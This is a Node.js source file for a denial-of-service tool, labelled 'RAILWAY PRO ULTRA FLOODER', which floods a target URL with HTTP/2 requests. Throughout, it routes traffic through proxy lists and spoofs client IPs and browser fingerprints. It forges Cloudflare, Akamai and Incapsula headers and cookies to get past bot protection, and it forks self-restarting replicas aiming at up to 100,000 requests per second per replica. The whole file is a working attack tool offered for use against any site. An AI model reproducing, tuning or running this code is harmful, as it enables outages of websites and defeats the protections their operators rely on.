const crypto = require('crypto');
const tls = require('tls');
const net = require('net');
const http2 = require('http2');
const fs = require('fs');
const cluster = require('cluster');
const socks = require('socks').SocksClient;
const os = require('os');
const { performance } = require('perf_hooks');

// ========== RAILWAY PRO ULTRA CONFIGURATION ==========
const RAILWAY_PRO = {
    // Railway Pro limits
    MAX_REPLICAS: 50,
    MAX_VCPU_PER_REPLICA: 32,
    MAX_RAM_PER_REPLICA: 32 * 1024, // MB
    MAX_TOTAL_RAM: 1024 * 1024, // MB (1TB)
    
    // Auto-scaling configuration
    AUTO_SCALE: true,
    SCALE_THRESHOLD: 0.75, // Scale when 75% of resources used
    MIN_REPLICAS: 1,
    MAX_REPLICAS: 50,
    
    // Performance tuning
    CONNECTIONS_PER_CORE: 2500, // Aggressive but stable
    STREAMS_PER_CONNECTION: 1000,
    REQUEST_QUEUE_SIZE: 50000,
    BATCH_SIZE: 1000,
    
    // Attack optimization
    MAX_RATE_PER_REPLICA: 100000, // 100k RPS per replica
    MAX_CONCURRENT_STREAMS: 50000,
    CONNECTION_POOL_SIZE: 10000,
    
    // Memory management
    MEMORY_BUFFER: 0.2, // Keep 20% memory free
    CONNECTION_TTL: 30000, // 30 seconds
    HEALTH_CHECK_INTERVAL: 5000
};

// ========== RAILWAY RESOURCE OPTIMIZER ==========
class RailwayOptimizer {
    constructor() {
        this.cpuCount = os.cpus().length;
        this.totalMemory = os.totalmem() / 1024 / 1024; // MB
        this.freeMemory = os.freemem() / 1024 / 1024; // MB
        this.loadAverage = os.loadavg();
        this.startTime = Date.now();
        this.performanceMetrics = {
            requestsPerSecond: 0,
            activeConnections: 0,
            memoryUsage: [],
            cpuUsage: []
        };
    }

    getOptimalSettings() {
        // Calculate optimal settings based on Railway Pro resources
        const baseConnections = this.cpuCount * RAILWAY_PRO.CONNECTIONS_PER_CORE;
        const memoryBasedConnections = Math.floor(this.freeMemory * 200); // 200 connections per MB free
        
        return {
            maxConnections: Math.min(baseConnections, memoryBasedConnections, 100000),
            maxStreams: RAILWAY_PRO.MAX_CONCURRENT_STREAMS,
            batchSize: Math.min(RAILWAY_PRO.BATCH_SIZE, Math.floor(this.freeMemory * 50)),
            workerThreads: this.cpuCount,
            concurrencyLevel: Math.min(1000, Math.floor(this.cpuCount * 100))
        };
    }

    getReplicaCount() {
        if (!RAILWAY_PRO.AUTO_SCALE) return 1;
        
        const loadFactor = this.loadAverage[0] / this.cpuCount;
        const memoryFactor = 1 - (this.freeMemory / this.totalMemory);
        const scalingFactor = Math.max(loadFactor, memoryFactor);
        
        if (scalingFactor > RAILWAY_PRO.SCALE_THRESHOLD) {
            // Scale up
            return Math.min(RAILWAY_PRO.MAX_REPLICAS, 
                Math.ceil(scalingFactor * RAILWAY_PRO.MAX_REPLICAS));
        }
        return RAILWAY_PRO.MIN_REPLICAS;
    }

    monitor() {
        setInterval(() => {
            this.freeMemory = os.freemem() / 1024 / 1024;
            this.loadAverage = os.loadavg();
            
            // Adjust settings based on load
            if (this.freeMemory < this.totalMemory * RAILWAY_PRO.MEMORY_BUFFER) {
                // Low memory - reduce intensity
                global.currentRate = Math.max(10000, Math.floor(global.currentRate * 0.7));
            } else if (this.loadAverage[0] > this.cpuCount * 0.9) {
                // High CPU - reduce
                global.currentRate = Math.max(10000, Math.floor(global.currentRate * 0.8));
            } else if (this.loadAverage[0] < this.cpuCount * 0.3 && this.freeMemory > this.totalMemory * 0.5) {
                // Low load, plenty memory - increase
                global.currentRate = Math.min(RAILWAY_PRO.MAX_RATE_PER_REPLICA * this.cpuCount, 
                    Math.floor(global.currentRate * 1.2));
            }
        }, RAILWAY_PRO.HEALTH_CHECK_INTERVAL);
    }
}

// ========== ULTRA FAST CONNECTION POOL ==========
class UltraConnectionPool {
    constructor(maxSize = 10000) {
        this.pool = new Map();
        this.maxSize = maxSize;
        this.stats = {
            created: 0,
            active: 0,
            failed: 0,
            recycled: 0
        };
        this.connectionQueue = [];
        this.startCleanup();
    }

    async getConnection(key, creator) {
        // Check for existing valid connection
        if (this.pool.has(key)) {
            const conn = this.pool.get(key);
            if (this.isValid(conn)) {
                conn.lastUsed = Date.now();
                conn.uses++;
                this.stats.recycled++;
                this.stats.active++;
                return conn;
            } else {
                this.pool.delete(key);
            }
        }

        // Create new connection if under limit
        if (this.pool.size < this.maxSize) {
            try {
                const conn = await creator();
                this.pool.set(key, {
                    ...conn,
                    createdAt: Date.now(),
                    lastUsed: Date.now(),
                    uses: 1
                });
                this.stats.created++;
                this.stats.active++;
                return this.pool.get(key);
            } catch (err) {
                this.stats.failed++;
                throw err;
            }
        }

        // Pool full - queue or wait
        return new Promise((resolve, reject) => {
            const timeout = setTimeout(() => reject(new Error('Connection timeout')), 5000);
            this.connectionQueue.push({ key, creator, resolve, reject, timeout });
        });
    }

    isValid(conn) {
        return conn.client && 
               !conn.client.destroyed && 
               Date.now() - conn.lastUsed < RAILWAY_PRO.CONNECTION_TTL;
    }

    release(key) {
        if (this.pool.has(key)) {
            const conn = this.pool.get(key);
            conn.lastUsed = Date.now();
            this.stats.active--;
            
            // Process queued connections
            if (this.connectionQueue.length > 0) {
                const queued = this.connectionQueue.shift();
                clearTimeout(queued.timeout);
                this.getConnection(queued.key, queued.creator)
                    .then(queued.resolve)
                    .catch(queued.reject);
            }
        }
    }

    startCleanup() {
        setInterval(() => {
            const now = Date.now();
            for (const [key, conn] of this.pool.entries()) {
                if (now - conn.lastUsed > RAILWAY_PRO.CONNECTION_TTL || !this.isValid(conn)) {
                    try {
                        conn.client?.close();
                        conn.tlsSocket?.destroy();
                        conn.socket?.destroy();
                    } catch {}
                    this.pool.delete(key);
                }
            }
        }, 10000);
    }

    getStats() {
        return {
            ...this.stats,
            size: this.pool.size,
            queueLength: this.connectionQueue.length,
            maxSize: this.maxSize
        };
    }
}

// ========== ADVANCED BYPASS TECHNIQUES ==========
class AdvancedBypass {
    constructor() {
        this.fingerprints = this.generateFingerprints();
        this.sessionTokens = new Map();
        this.bypassPatterns = this.loadBypassPatterns();
    }

    generateFingerprints() {
        return [
            {
                ua: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                accept: 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
                encoding: 'gzip, deflate, br',
                language: 'en-US,en;q=0.9',
                platform: 'Windows',
                secChUa: '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"'
            },
            {
                ua: 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Safari/605.1.15',
                accept: 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                encoding: 'gzip, deflate, br',
                language: 'en-US,en;q=0.9',
                platform: 'macOS'
            },
            {
                ua: 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                accept: 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
                encoding: 'gzip, deflate, br',
                language: 'en-US,en;q=0.9',
                platform: 'Linux'
            }
        ];
    }

    loadBypassPatterns() {
        return {
            cloudflare: [
                'cf-clearance', '__cf_bm', 'cf_clearance', 'cf-chl-bypass',
                'cf-ray', '__cfduid', 'cf-chl-proto'
            ],
            akamai: [
                'ak_bmsc', 'bm_sz', '_abck', 'bm_mi', 'bm_sv'
            ],
            incapsula: [
                'incap_ses', 'nlbi_', 'visid_incap'
            ],
            perimeterx: [
                'px_cookie', 'px_verified', 'px_pxhd'
            ],
            datadome: [
                'datadome', 'datadome-token'
            ]
        };
    }

    generateBypassHeaders(hostname, targetType = 'cloudflare') {
        const timestamp = Date.now();
        const sessionId = crypto.randomBytes(16).toString('hex');
        const fingerprint = this.fingerprints[Math.floor(Math.random() * this.fingerprints.length)];
        
        const headers = {
            'user-agent': fingerprint.ua,
            'accept': fingerprint.accept,
            'accept-encoding': fingerprint.encoding,
            'accept-language': fingerprint.language,
            'cache-control': 'no-cache, no-store, must-revalidate',
            'pragma': 'no-cache',
            'upgrade-insecure-requests': '1',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
            'sec-fetch-user': '?1',
            'dnt': '1'
        };

        // Add browser-specific headers
        if (fingerprint.secChUa) {
            headers['sec-ch-ua'] = fingerprint.secChUa;
            headers['sec-ch-ua-mobile'] = '?0';
            headers['sec-ch-ua-platform'] = `"${fingerprint.platform}"`;
        }

        // Add bypass-specific headers
        const bypassHeaders = this.generateTargetBypass(hostname, targetType, sessionId, timestamp);
        Object.assign(headers, bypassHeaders);

        // Add cookies
        headers['cookie'] = this.generateBypassCookies(hostname, targetType, sessionId, timestamp);

        return headers;
    }

    generateTargetBypass(hostname, targetType, sessionId, timestamp) {
        const entropy = crypto.randomBytes(32).toString('hex');
        
        switch(targetType) {
            case 'cloudflare':
                return {
                    'cf-connecting-ip': this.randomIP(),
                    'cf-ipcountry': this.randomCountry(),
                    'cf-ray': this.generateCFRay(),
                    'cf-visitor': '{"scheme":"https"}',
                    'x-forwarded-for': this.randomIP(),
                    'x-real-ip': this.randomIP(),
                    'x-cf-edge-delay': Math.floor(Math.random() * 20 + 5).toString(),
                    'x-cf-session-id': sessionId,
                    'x-cf-timestamp': timestamp.toString()
                };
            
            case 'akamai':
                return {
                    'x-akamai-edgescape': this.generateAkamaiEdge(),
                    'x-akamai-session-id': sessionId,
                    'x-akamai-request-id': crypto.randomBytes(16).toString('hex'),
                    'x-forwarded-for': this.randomIP(),
                    'via': '1.1 akamai.net',
                    'x-akamai-transaction-id': crypto.randomBytes(8).toString('hex')
                };
            
            case 'incapsula':
                return {
                    'x-incapsula-request-id': crypto.randomBytes(16).toString('hex'),
                    'x-incapsula-session': sessionId,
                    'x-forwarded-for': this.randomIP(),
                    'x-requested-with': 'XMLHttpRequest'
                };
            
            default:
                return {
                    'x-forwarded-for': this.randomIP(),
                    'x-real-ip': this.randomIP(),
                    'x-request-id': crypto.randomUUID()
                };
        }
    }

    generateBypassCookies(hostname, targetType, sessionId, timestamp) {
        const cookies = [];
        
        // Common tracking cookies
        cookies.push(`_ga=GA1.1.${Math.random().toString(36).substr(2, 10)}.${timestamp}`);
        cookies.push(`_gid=GA1.2.${Math.random().toString(36).substr(2, 10)}.${timestamp}`);
        cookies.push(`_fbp=fb.1.${timestamp}.${Math.random().toString(36).substr(2, 8)}`);
        
        // Target-specific cookies
        switch(targetType) {
            case 'cloudflare':
                cookies.push(`__cf_bm=${crypto.randomBytes(32).toString('base64')}`);
                cookies.push(`cf_clearance=${crypto.randomBytes(48).toString('base64')}.${sessionId}-${timestamp}`);
                cookies.push(`__cfduid=${crypto.randomBytes(32).toString('hex')}`);
                break;
            
            case 'akamai':
                cookies.push(`ak_bmsc=${crypto.randomBytes(64).toString('base64')}`);
                cookies.push(`bm_sz=${crypto.randomBytes(64).toString('base64')}`);
                cookies.push(`_abck=${crypto.randomBytes(96).toString('base64')}`);
                break;
            
            case 'incapsula':
                cookies.push(`incap_ses_${Math.random().toString(36).substr(2, 8)}=${crypto.randomBytes(32).toString('hex')}`);
                cookies.push(`nlbi_${Math.random().toString(36).substr(2, 6)}=${crypto.randomBytes(16).toString('hex')}`);
                break;
        }
        
        return cookies.join('; ');
    }

    randomIP() {
        return `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
    }

    randomCountry() {
        const countries = ['US', 'VN', 'JP', 'KR', 'SG', 'DE', 'FR', 'GB', 'CA', 'AU', 'BR', 'IN'];
        return countries[Math.floor(Math.random() * countries.length)];
    }

    generateCFRay() {
        return crypto.randomBytes(8).toString('hex') + '-' + this.randomCountry();
    }

    generateAkamaiEdge() {
        const locations = ['IAD', 'LHR', 'NRT', 'SIN', 'SYD', 'FRA', 'AMS'];
        return `${locations[Math.floor(Math.random() * locations.length)]}=${Math.floor(Math.random() * 1000)}`;
    }
}

// ========== ULTRA FAST HTTP/2 ENGINE ==========
class UltraHTTP2Engine {
    constructor(options = {}) {
        this.options = options;
        this.bypass = new AdvancedBypass();
        this.connectionPool = new UltraConnectionPool(RAILWAY_PRO.CONNECTION_POOL_SIZE);
        this.stats = {
            totalRequests: 0,
            successfulRequests: 0,
            failedRequests: 0,
            bytesSent: 0,
            bytesReceived: 0,
            startTime: Date.now()
        };
        
        this.setupTLS();
    }

    setupTLS() {
        const ciphers = [
            'TLS_AES_128_GCM_SHA256',
            'TLS_AES_256_GCM_SHA384',
            'TLS_CHACHA20_POLY1305_SHA256',
            'ECDHE-ECDSA-AES128-GCM-SHA256',
            'ECDHE-RSA-AES128-GCM-SHA256',
            'ECDHE-ECDSA-AES256-GCM-SHA384',
            'ECDHE-RSA-AES256-GCM-SHA384'
        ];

        this.tlsOptions = {
            ciphers: ciphers.join(':'),
            honorCipherOrder: true,
            minVersion: 'TLSv1.2',
            maxVersion: 'TLSv1.3',
            rejectUnauthorized: false,
            ALPNProtocols: ['h2', 'http/1.1'],
            servername: this.options.hostname,
            secureOptions: crypto.constants.SSL_OP_NO_SSLv2 |
                          crypto.constants.SSL_OP_NO_SSLv3 |
                          crypto.constants.SSL_OP_NO_TLSv1 |
                          crypto.constants.SSL_OP_NO_TLSv1_1 |
                          crypto.constants.SSL_OP_NO_COMPRESSION
        };
    }

    async createConnection(proxy, hostname, port = 443) {
        const proxyKey = `${proxy.host}:${proxy.port}`;
        
        return this.connectionPool.getConnection(proxyKey, async () => {
            const socket = await this.connectThroughProxy(proxy, hostname, port);
            const tlsSocket = tls.connect({
                socket,
                ...this.tlsOptions
            });

            return new Promise((resolve, reject) => {
                const timeout = setTimeout(() => {
                    reject(new Error('TLS connection timeout'));
                }, 10000);

                tlsSocket.once('secureConnect', () => {
                    clearTimeout(timeout);
                    if (tlsSocket.alpnProtocol !== 'h2') {
                        reject(new Error('ALPN negotiation failed'));
                        return;
                    }

                    const client = http2.connect(`https://${hostname}`, {
                        createConnection: () => tlsSocket,
                        settings: this.getOptimizedSettings(hostname)
                    });

                    client.once('error', reject);
                    
                    resolve({ client, tlsSocket, socket });
                });

                tlsSocket.once('error', reject);
            });
        });
    }

    connectThroughProxy(proxy, hostname, port) {
        return new Promise((resolve, reject) => {
            if (this.options.proxyType === 'http') {
                const socket = net.connect(proxy.port, proxy.host);
                
                socket.once('connect', () => {
                    const connectReq = 
                        `CONNECT ${hostname}:${port} HTTP/1.1\r\n` +
                        `Host: ${hostname}:${port}\r\n` +
                        `Proxy-Connection: Keep-Alive\r\n` +
                        (proxy.user && proxy.pass ? 
                            `Proxy-Authorization: Basic ${Buffer.from(`${proxy.user}:${proxy.pass}`).toString('base64')}\r\n` : '') +
                        `\r\n`;
                    
                    socket.write(connectReq);
                    
                    let response = '';
                    const dataHandler = (chunk) => {
                        response += chunk.toString();
                        if (response.includes('\r\n\r\n')) {
                            socket.removeListener('data', dataHandler);
                            if (response.includes('200 Connection established')) {
                                resolve(socket);
                            } else {
                                reject(new Error('Proxy connection failed'));
                            }
                        }
                    };
                    
                    socket.on('data', dataHandler);
                });
                
                socket.once('error', reject);
                
            } else {
                socks.createConnection({
                    proxy: {
                        host: proxy.host,
                        port: proxy.port,
                        type: this.options.proxyType === 'socks5' ? 5 : 4,
                        userId: proxy.user,
                        password: proxy.pass
                    },
                    command: 'connect',
                    destination: {
                        host: hostname,
                        port: port
                    },
                    timeout: 10000
                }, (err, info) => {
                    if (err) reject(err);
                    else resolve(info.socket);
                });
            }
        });
    }

    getOptimizedSettings(hostname) {
        // Railway Pro optimized HTTP/2 settings
        return {
            headerTableSize: 65536,
            initialWindowSize: 6291456 * 2, // Double for Railway
            maxHeaderListSize: 262144,
            enablePush: false,
            maxConcurrentStreams: RAILWAY_PRO.MAX_CONCURRENT_STREAMS,
            maxFrameSize: 16777215, // Max allowed
            enableConnectProtocol: false
        };
    }

    async sendRequest(connection, targetUrl, method = 'GET') {
        const { client } = connection;
        const url = new URL(targetUrl);
        const targetType = this.detectTargetType(url.hostname);
        
        const headers = this.bypass.generateBypassHeaders(url.hostname, targetType);
        headers[':method'] = method;
        headers[':path'] = url.pathname + url.search;
        headers[':authority'] = url.hostname;
        headers[':scheme'] = 'https';

        // Add random parameters for cache bypass
        if (Math.random() > 0.3) {
            headers[':path'] += (url.search ? '&' : '?') + 
                `_=${Date.now()}&r=${crypto.randomBytes(4).toString('hex')}`;
        }

        return new Promise((resolve, reject) => {
            const req = client.request(headers, {
                endStream: method === 'GET'
            });

            const startTime = Date.now();
            let responseData = '';

            req.on('response', (headers) => {
                const status = headers[':status'];
                this.stats.totalRequests++;
                
                if (status >= 200 && status < 400) {
                    this.stats.successfulRequests++;
                } else {
                    this.stats.failedRequests++;
                }

                resolve({
                    status,
                    headers,
                    time: Date.now() - startTime
                });
            });

            req.on('data', (chunk) => {
                responseData += chunk;
                this.stats.bytesReceived += chunk.length;
            });

            req.on('error', (err) => {
                this.stats.failedRequests++;
                reject(err);
            });

            req.on('end', () => {});

            if (method === 'POST') {
                const postData = JSON.stringify({ 
                    timestamp: Date.now(),
                    random: crypto.randomBytes(16).toString('hex')
                });
                req.write(postData);
                req.end();
                this.stats.bytesSent += postData.length;
            }

            // Auto timeout
            setTimeout(() => {
                req.destroy();
                reject(new Error('Request timeout'));
            }, 10000);
        });
    }

    detectTargetType(hostname) {
        const host = hostname.toLowerCase();
        if (host.includes('cloudflare') || host.includes('cdn-cgi')) return 'cloudflare';
        if (host.includes('akamai')) return 'akamai';
        if (host.includes('incapsula')) return 'incapsula';
        if (host.includes('ddos-guard')) return 'ddosguard';
        return 'generic';
    }

    async attack(target, duration, rate, threads) {
        const endTime = Date.now() + (duration * 1000);
        const targetUrl = new URL(target).href;
        const hostname = new URL(target).hostname;
        
        // Load proxies
        const proxies = this.loadProxies(this.options.proxyFile);
        console.log(`Loaded ${proxies.length} proxies for attack`);

        // Create worker pools
        const workers = [];
        const requestsPerWorker = Math.floor(rate / threads);
        
        for (let i = 0; i < threads; i++) {
            workers.push(this.workerLoop(i, targetUrl, hostname, proxies, requestsPerWorker, endTime));
        }

        // Monitor and report
        const monitor = setInterval(() => {
            const elapsed = (Date.now() - this.stats.startTime) / 1000;
            const rps = Math.floor(this.stats.totalRequests / elapsed);
            
            console.log(`[${new Date().toLocaleTimeString()}] ` +
                `RPS: ${rps} | Total: ${this.stats.totalRequests} | ` +
                `Success: ${this.stats.successfulRequests} | ` +
                `Failed: ${this.stats.failedRequests} | ` +
                `Connections: ${this.connectionPool.stats.active}`);
            
            // Update global rate for auto-scaling
            global.currentRate = rps;
        }, 3000);

        // Wait for all workers to complete
        await Promise.all(workers);
        clearInterval(monitor);
        
        return this.stats;
    }

    async workerLoop(workerId, targetUrl, hostname, proxies, targetRate, endTime) {
        const requestsPerSecond = Math.floor(targetRate / proxies.length) || 1;
        const delayBetweenRequests = 1000 / requestsPerSecond;
        
        while (Date.now() < endTime) {
            const proxy = proxies[Math.floor(Math.random() * proxies.length)];
            
            try {
                const connection = await this.createConnection(proxy, hostname);
                
                // Send multiple requests per connection
                const batchSize = Math.min(100, RAILWAY_PRO.MAX_CONCURRENT_STREAMS);
                const batch = [];
                
                for (let i = 0; i < batchSize; i++) {
                    batch.push(this.sendRequest(connection, targetUrl, 
                        Math.random() > 0.7 ? 'POST' : 'GET'));
                }
                
                await Promise.all(batch);
                
                // Release connection back to pool
                this.connectionPool.release(`${proxy.host}:${proxy.port}`);
                
            } catch (err) {
                // Silently fail and continue
            }
            
            // Rate limiting
            await new Promise(resolve => setTimeout(resolve, delayBetweenRequests));
        }
    }

    loadProxies(filename) {
        try {
            const content = fs.readFileSync(filename, 'utf8');
            return content.split('\n')
                .map(line => line.trim())
                .filter(line => line && line.includes(':'))
                .map(line => {
                    const [host, port, user, pass] = line.split(':');
                    return {
                        host,
                        port: parseInt(port),
                        user: user || null,
                        pass: pass || null
                    };
                });
        } catch {
            return [];
        }
    }
}

// ========== COMMAND LINE INTERFACE ==========
const args = process.argv.slice(2);
const [target, duration, rate, threads, proxyFile, ...options] = args;

if (!target || !duration || !rate || !threads || !proxyFile) {
    console.log(`
╔══════════════════════════════════════════════════════════════╗
║  🚀 RAILWAY PRO ULTRA FLOODER                                 ║
╠══════════════════════════════════════════════════════════════╣
║  Usage: node railway-flooder.js <url> <time> <rate> <threads>║
║                      <proxy.txt> [options]                   ║
╠══════════════════════════════════════════════════════════════╣
║  Example:                                                     ║
║  node railway-flooder.js https://target.com 300 100000 100   ║
║                      proxy.txt --type http --max 50000       ║
╠══════════════════════════════════════════════════════════════╣
║  Options:                                                     ║
║    --type <http/socks4/socks5>  - Proxy type                 ║
║    --max <number>               - Max connections            ║
║    --bypass <all/cf/akamai>     - Bypass type                ║
║    --method <get/post/mix>      - Request method             ║
║    --threads <number>           - Worker threads             ║
╚══════════════════════════════════════════════════════════════╝
    `);
    process.exit(1);
}

// Parse options
const parsedOptions = {
    proxyType: options.includes('--type') ? options[options.indexOf('--type') + 1] : 'http',
    maxConnections: options.includes('--max') ? parseInt(options[options.indexOf('--max') + 1]) : 50000,
    bypass: options.includes('--bypass') ? options[options.indexOf('--bypass') + 1] : 'all',
    method: options.includes('--method') ? options[options.indexOf('--method') + 1] : 'mix',
    workerThreads: options.includes('--threads') ? parseInt(options[options.indexOf('--threads') + 1]) : os.cpus().length
};

// Initialize optimizer
const optimizer = new RailwayOptimizer();
const settings = optimizer.getOptimalSettings();

console.log(`
╔══════════════════════════════════════════════════════════════╗
║  🚀 RAILWAY PRO ULTRA FLOODER - INITIALIZED                   ║
╠══════════════════════════════════════════════════════════════╣
║  Target: ${target.substring(0, 40)}...                              ║
║  Duration: ${duration}s                                           ║
║  Rate: ${parseInt(rate).toLocaleString()} RPS                                ║
║  Threads: ${threads}                                              ║
╠══════════════════════════════════════════════════════════════╣
║  🖥️  RAILWAY PRO RESOURCES                                     ║
║  CPU Cores: ${os.cpus().length}                                          ║
║  Total RAM: ${Math.round(os.totalmem() / 1024 / 1024 / 1024)}GB                                      ║
║  Max Connections: ${settings.maxConnections.toLocaleString()}                           ║
║  Batch Size: ${settings.batchSize}                                          ║
╠══════════════════════════════════════════════════════════════╣
║  ⚡ OPTIMIZED SETTINGS                                        ║
║  Concurrency: ${settings.concurrencyLevel}                                      ║
║  Worker Threads: ${parsedOptions.workerThreads}                                      ║
║  Proxy Type: ${parsedOptions.proxyType.toUpperCase()}                                      ║
║  Bypass Mode: ${parsedOptions.bypass.toUpperCase()}                                      ║
╚══════════════════════════════════════════════════════════════╝
`);

// Start the attack
if (cluster.isPrimary) {
    const replicaCount = optimizer.getReplicaCount();
    console.log(`🚀 Scaling to ${replicaCount} Railway Pro replicas...`);
    
    for (let i = 0; i < replicaCount; i++) {
        cluster.fork();
    }
    
    cluster.on('exit', (worker) => {
        console.log(`🔄 Replica ${worker.id} restarted`);
        cluster.fork();
    });
    
    setTimeout(() => {
        console.log('\n✅ Attack completed!');
        process.exit(0);
    }, duration * 1000);
    
} else {
    const engine = new UltraHTTP2Engine({
        hostname: new URL(target).hostname,
        proxyType: parsedOptions.proxyType,
        proxyFile: proxyFile
    });
    
    engine.attack(target, parseInt(duration), parseInt(rate), parseInt(threads))
        .then(stats => {
            const elapsed = (Date.now() - stats.startTime) / 1000;
            console.log(`
╔══════════════════════════════════════════════════════════════╗
║  📊 FINAL STATISTICS                                          ║
╠══════════════════════════════════════════════════════════════╣
║  Total Requests: ${stats.totalRequests.toLocaleString()}                           ║
║  Successful: ${stats.successfulRequests.toLocaleString()} (${Math.round(stats.successfulRequests / stats.totalRequests * 100)}%)   ║
║  Failed: ${stats.failedRequests.toLocaleString()}                              ║
║  Average RPS: ${Math.round(stats.totalRequests / elapsed)}                                   ║
║  Data Sent: ${(stats.bytesSent / 1024 / 1024).toFixed(2)} MB                                 ║
║  Data Received: ${(stats.bytesReceived / 1024 / 1024).toFixed(2)} MB                             ║
║  Duration: ${elapsed.toFixed(2)}s                                          ║
╚══════════════════════════════════════════════════════════════╝
            `);
            process.exit(0);
        })
        .catch(err => {
            console.error('Attack failed:', err.message);
            process.exit(1);
        });
}
